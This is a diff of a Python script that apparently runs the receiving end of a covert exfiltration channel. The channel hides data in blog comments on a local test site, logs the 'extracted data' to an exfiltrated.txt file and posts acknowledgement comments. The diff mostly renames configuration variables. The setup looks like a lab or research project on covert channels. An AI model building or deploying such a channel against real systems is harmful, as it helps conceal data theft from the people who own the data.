@@ -12,25 +12,20 @@ random.seed(int(datetime.datetime.now().timestamp()) + int(server_id))
 channel = Channel()
 channel.target_blog = "http://127.0.0.3/"
 channel.exfil_channel = "2021/08/13/exfil-channel/"
-channel.exfil_channel_id = get_post_id(channel.target_blog, channel.exfil_channel)
 channel.ack_channel = "2021/08/13/ack-channel/"
-channel.ack_channel_id = 7
+channel.exfil_channel_id = get_post_id(channel.target_blog, channel.exfil_channel)
 channel.ack_channel_id = get_post_id(channel.target_blog, channel.ack_channel)
 
-# Timings
-## For server:
-## 
-
-recv_config = ReceiveConfig()
-recv_config.recvr_id = server_id
-recv_config.recv_time_slot = 30
-recv_config.process_time_slot = 40
-recv_config.prev_unapproved_index = 0
+btm_recv_config = ReceiveConfig()
+btm_recv_config.recvr_id = server_id
+btm_recv_config.recv_time_slot = 30
+btm_recv_config.process_time_slot = 40
+btm_recv_config.prev_unapproved_index = 0
 
 mtb_send_config= SendConfig()
 mtb_send_config.sender_id = server_id
 mtb_send_config.send_time_slot = 10
-# mtb_send_config.confirm_time_slot = 30
+mtb_send_config.confirm_time_slot = None # The master does not need to confim if its message has been sent successfully
 
 class Client:
     id = ""
@@ -44,16 +39,16 @@ for i in range(1, 4):
     print("## Created client with id: " + str(client.id))
 
 def thread_start_listener():
-    if recv_config.prev_unapproved_index == 0:
-        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
+    if btm_recv_config.prev_unapproved_index == 0:
+        btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
 
     loop_counter = 99
     while(loop_counter > 0):
-        received_data = receive_data(channel, len(clients), recv_config)
+        received_data = receive_data(channel, len(clients), btm_recv_config)
 
         for exfil_content in received_data:
             to_write = str(datetime.datetime.utcnow()) + ": "
-            to_write += "Extracted data with timeslot of " + str(recv_config.recv_time_slot) + ": " + exfil_content + "\n"
+            to_write += "Extracted data with timeslot of " + str(btm_recv_config.recv_time_slot) + ": " + exfil_content + "\n"
             print("[INFO] thread_start_listener: " + to_write);
             f = open("../output/exfiltrated.txt", "a")
             f.write(to_write)
@@ -64,7 +59,7 @@ def thread_start_listener():
             response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
             print("## " + str(response.html_response_code) + ", " + response.html_response)
 
-        recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
+        btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            
         loop_counter -= 1
 
 threading.Thread(target=thread_start_listener).start()
